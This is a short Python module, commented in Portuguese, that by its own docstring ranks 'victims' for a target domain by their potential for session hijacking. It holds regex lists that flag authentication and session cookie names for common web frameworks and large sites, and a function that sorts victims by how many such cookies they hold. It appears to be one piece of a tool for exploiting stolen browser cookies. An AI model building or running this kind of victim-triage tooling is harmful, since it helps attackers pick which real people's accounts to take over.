"""Selecao da melhor vítima para um dominio alvo e heuristica leve de artefato.

A classificacao completa (authentication/session/tracking/...) e formalizada na
M3; aqui usamos uma heuristica simples de nomes para ordenar vítimas pelo
potencial de session hijack.
"""

from __future__ import annotations

import re

from typing import List, Tuple

# Padroes de nomes de cookie que indicam artefatos de autenticacao/sessao.
_AUTH_PATTERNS = [
    r"^session", r"^sess", r"sessid", r"sessionid", r"^sid$", r"^auth",
    r"^token$", r"token$", r"-token$", r"^id$", r"^login",
    r"^__host-", r"^__secure-", r"^jwt", r"^bearer", r"^refresh",
    r"^connect\.sid", r"phpsessid", r"aspxauth", r"jsessionid",
    r"^cfjwt", r"^x-main$", r"^ubid-main$", r"^am-token", r"^session-token",
    r"^session-id", r"^at-main$", r"^sso-", r"^nl\.session", r"^udc-main",
]

_ANON_PATTERNS = [
    r"^i18n-prefs", r"^lc-main", r"^lc-main-av", r"^sp-cdn", r"^av-timezone",
    r"^csmt-hit", r"^aws-priv", r"^aws-target-data", r"^optanon",
    r"^amcv", r"^s_vnum", r"^_ga", r"^_gid", r"^_gcl", r"^aam_",
]

_COMPILED_AUTH = [re.compile(p, re.IGNORECASE) for p in _AUTH_PATTERNS]
_COMPILED_ANON = [re.compile(p, re.IGNORECASE) for p in _ANON_PATTERNS]


def classify_name(name: str) -> str:
    """Classifica o nome de um cookie em auth/session/anonimo/outro (heuristica)."""
    name = name or ""
    for pattern in _COMPILED_AUTH:
        if pattern.search(name):
            return "auth"
    for pattern in _COMPILED_ANON:
        if pattern.search(name):
            return "anon"
    return "other"


def is_auth_candidate(name: str) -> bool:
    return classify_name(name) == "auth"


def rank_victims(rows: List[dict]) -> List[Tuple[int, int, int]]:
    """
    Recebe linhas (victim_id, auth_candidates, cookie_count) e retorna
    ordenado por (auth_candidates desc, cookie_count desc) -> (victim_id, auth, total).
    """
    ranked = sorted(
        rows,
        key=lambda r: (r.get("auth", 0), r.get("total", 0)),
        reverse=True,
    )
    return [(r["victim_id"], r.get("auth", 0), r.get("total", 0)) for r in ranked]